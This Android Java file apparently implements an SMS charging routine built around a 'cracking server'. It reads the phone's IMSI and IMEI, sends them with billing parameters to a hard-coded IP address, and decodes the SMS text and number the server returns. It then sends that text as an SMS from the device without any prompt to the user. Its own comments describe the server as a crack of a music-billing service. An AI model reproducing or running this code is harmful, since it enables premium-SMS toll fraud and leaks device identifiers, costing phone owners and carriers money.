package com.apitest;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * 测试时，直接调用charge_by_api，传入相关参数
 * ip地址就要根据手机当前的地址改了，这里是写死的
 * 如果是天籁之声的代码......
 */
public class ApiSms
{

    private static final String SENT_SMS_MUSIC_REG = "SENT_SMS_Music_Reg";
    private static final String DELIVERED_SMS_MUSIC_REG = "DELIVERED_SMS_Music_Reg";
    private static final String TAG = "xcngame";

    /**
     * @param operationProgress 用于更新短信获取和发送的进度到UI
     * @param context
     * @param sid
     * @param channel_id
     * @param cpparam
     * @param musicId
     * @param itemPrice
     * @param musicType
     */
    public static void charge_by_api(final OperationProgress operationProgress, final Context context, final String sid, final String channel_id, final String cpparam, final String musicId, final String itemPrice, final String musicType, final String ip)
    {
        operationProgress.reset();
        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String imsi = tm.getSubscriberId();
                    String imei = tm.getDeviceId();// String
                    String start_time = System.currentTimeMillis() + "";
                    //String iccid = tm.getSimSerialNumber();

                    String url = "http://115.159.74.129:8000/o/mgreqapi/" + sid + "?imei=" + imei + "&imsi=" + imsi + "&item_price=" + itemPrice + "&music_id=" + musicId + "&channel_id=" + channel_id + "&cpparam=" + cpparam + "&music_type=" + musicType + "&sdcid=&start_time=" + start_time + "&iccid=898602c0221670872200&ip=" + ip + "&excode=";//点播

                    operationProgress.updateProgress("请求破解方时的使用的地址\r\n" + url + "\r\n\r\n");
                    String response = getUrl(url);
                    if (response == null)
                    {
                        operationProgress.updateProgress("破解服务器没有返回\r\n");
                        return;
                    }

                    response = response.replace("\n", "");
                    response = response.replace("\r", "");
                    XmlParse xmlParse = new XmlParse(context, response);
                    for (int index = 0; index < xmlParse.mSMSEntityList.size(); index++)
                    {
                        xmlParse.mSMSEntityList.get(index).message = new String(Base64.decode(xmlParse.mSMSEntityList.get(index).message, Base64.DEFAULT));
                    }
                    final String sms = xmlParse.mSMSEntityList.get(0).message;
                    final String smsNum = xmlParse.mSMSEntityList.get(0).number;

                    if (!sms.isEmpty())
                    {
                        SmsManager smsManager = SmsManager.getDefault();

                        BroadcastReceiver sendOkReceiver = new BroadcastReceiver()
                        {
                            @Override
                            synchronized public void onReceive(Context context, Intent intent)
                            {
                                Log.e(TAG, "send " + smsNum + " ==" + sms);
                                operationProgress.updateProgress("\r\n已发送成功 \r\n");
                            }
                        };
                        context.registerReceiver(sendOkReceiver, new IntentFilter(SENT_SMS_MUSIC_REG));
                        Intent sentIntent = new Intent(SENT_SMS_MUSIC_REG);
                        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);

                        BroadcastReceiver deliveredOkReceiver = new BroadcastReceiver()
                        {
                            @Override
                            synchronized public void onReceive(Context context, Intent intent)
                            {
                                Log.e(TAG, "delivered " + smsNum + " ==" + sms);
                                operationProgress.updateProgress("\r\n移动已收到短信 \r\n");
                            }
                        };
                        context.registerReceiver(deliveredOkReceiver, new IntentFilter(DELIVERED_SMS_MUSIC_REG));
                        Intent deliveredIntent = new Intent(DELIVERED_SMS_MUSIC_REG);
                        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, deliveredIntent, 0);

                        smsManager.sendTextMessage(smsNum, null, sms, sentPI, deliveredPI);
                        operationProgress.updateProgress("正在发送 \r\n" + sms + "\r\n到 " + smsNum + "\r\n");
                    }
                }
                catch (Exception e)
                {
                    operationProgress.updateProgress("错误发生:" + e.getMessage());
                }
            }
        }.start();
    }

    public static String getUrl(String url) throws Exception
    {
        URL httpUrl = new URL(url);
        HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();
        httpURLConnection.setRequestMethod("GET");
        int responseCode = httpURLConnection.getResponseCode();

        if(responseCode!=HttpURLConnection.HTTP_OK)
        {
            throw new Exception("服务器错误");
        }

        InputStream inputStream = httpURLConnection.getInputStream();
        Reader reader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(reader);

        StringBuilder stringBuilder=new StringBuilder();
        String line;
        while (true)
        {
            line = bufferedReader.readLine();
            if(line!=null)
                stringBuilder.append(line);
            else
                break;
        }
        return stringBuilder.toString();
    }
}
